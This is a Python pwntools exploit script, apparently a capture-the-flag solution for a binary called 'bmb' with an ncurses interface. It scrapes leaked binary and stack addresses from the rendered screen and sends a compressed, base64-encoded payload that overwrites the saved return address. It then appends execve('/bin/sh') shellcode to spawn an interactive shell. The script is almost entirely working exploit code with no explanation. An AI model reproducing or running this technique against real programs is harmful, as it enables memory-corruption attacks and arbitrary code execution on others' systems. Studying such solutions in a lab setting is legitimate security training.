#!/usr/bin/env python3
import os
from pwn import *
import zlib
import base64
import pyte

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('bmb', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*run_menu+1183
        c
        ''')
        sleep(1)
COLS, LINES = 120, 60

os.environ['PWNLIB_NOTERM'] = '1'
os.environ['TERM'] = 'xterm-256color'
os.environ['LINES'] = str(LINES)
os.environ['COLUMNS'] = str(COLS)
screen = pyte.Screen(COLS, LINES)
stream = pyte.ByteStream(screen)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])


sleep(0.1)
###########################
### parse ncurse screen ###
###########################
leak = False
moves = 0

###################################################################
### enter load --> leak --> win --> e --> e -->  to spawn shell ###
###################################################################

while True:

    if leak:
        b = p.recv()
        stream.feed(b)
    
        # 3. Parse and Print Screen
        cleaned_scr = []
        # Using your specific row/column crops
        for disp in screen.display[:60]: 
            cleaned_scr.append(disp[:])
        info(f'row len: {len(cleaned_scr)}')
        info(f'column len: {len(disp)}')

        for row in cleaned_scr:
            print(row)

    elif  moves != "a" and moves != "d" and leak==False:
        b = p.recv()
        stream.feed(b)
    
        # 3. Parse and Print Screen
        cleaned_scr = []
        # Using your specific row/column crops
        for disp in screen.display[42:45]: 
            cleaned_scr.append(disp[:28])
        info(f'row len: {len(cleaned_scr)}')
        info(f'column len: {len(disp)}')


        for row in cleaned_scr:
            print(row)
    
    moves = input("\nYour next input (wasd / stop): ")
    
    if moves == "stop":
        break

    elif moves == "e":
        s(b'\n')
        continue
    elif moves == "load":
        s(b'w')
        sleep(0.1)

        s(b'w')
        sleep(0.1)

        s(b's')
        sleep(0.1)

        s(b's')
        sleep(0.1)

        s(b'a')
        sleep(0.1)

        s(b'd')
        sleep(0.1)
        
        s(b'a')
        sleep(0.1)
        
        s(b'd')
        sleep(0.1)
        
        s(b'\n')
        sleep(0.1)

        s(b's')
        sleep(1)

        s(b'\n')
        sleep(0.1)
        
        s(b'1')
        sleep(0.1)
        
        moves="1"
        continue

    elif moves== "leak":
        for row_i, row in enumerate(cleaned_scr):
            info(f'len row {row_i+1}: {len(row)}')
            if 'world addr=' in row:
                binary_leak = int(row[14:], 16)
                exe.address = binary_leak - 0xd520
                info(f'binary leak: {hex(binary_leak)}')
                info(f'binary base: {hex(exe.address)}')

            if 'x world=' in row:
                stack_leak = int(row[9:], 16)
                info(f'stack leak: {hex(stack_leak)}')
        leak=True
    elif moves == "win":
        s(b'q')
        s(b'2')
        s(b'q')
        s(b's')
        s(b's')
        s(b's')
        s(b'\n')

        offset_saved_rip = 0x48
        saved_rip = stack_leak-0x48
        shell_addr = stack_leak - 0x240
        num = 0
        byte_list = []
        for i in range(6):
            byte_list.append((shell_addr>>num) & 0xff)
            num+=8
        load = (
f"""
clear
128
0
6
{byte_list[0]},-72,0
{byte_list[1]},-71,0
{byte_list[2]},-70,0
{byte_list[3]},-69,0
{byte_list[4]},-68,0
{byte_list[5]},-67,0
""")
        compressed_bytes = zlib.compress(load.encode(), level=9)
        res = base64.b64encode(compressed_bytes)
        info(f'res: {res}')
        res += asm("""
        nop
        nop
        
        mov rdi, 29400045130965551
        push rdi
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 0x3b
        syscall
                    
        """)
        s(res)
        continue
    s(moves.encode())

    
p.interactive()
